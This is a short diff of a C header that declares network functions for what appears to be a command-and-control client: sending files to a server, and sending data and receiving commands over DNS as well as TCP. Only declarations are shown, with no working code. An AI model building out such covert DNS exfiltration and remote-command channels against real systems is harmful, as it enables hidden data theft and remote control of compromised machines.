@@ -20,7 +20,7 @@
 
 // network.c
 int send_to_server_raw(const char *data, size_t len); 	        // Send a message to the server
-int send_to_server(char *message, ...);					        // Send a formatted message to the server
+int send_to_server(enum Protocol protocol, char *message, ...); // Send a formatted message to the server (DNS or TCP)
 int receive_from_server(char *buffer, size_t len);		        // Receive a message from the server
 int send_file_to_server(char *filename); 				        // Send a file to the server
 
@@ -37,7 +37,6 @@ int start_network_worker(void);							        // Start the network worker thread
 int stop_network_worker(void);						        	// Stop the network worker thread
 
 // protocols/dns/dns.c
-extern bool response_over_dns;                                  // Flag to indicate if response is over DNS 
 int dns_send_data(const char *data, size_t len);                // Send data over DNS
 int dns_receive_command(char *buffer, size_t max_len);          // Receive command over DNS
 
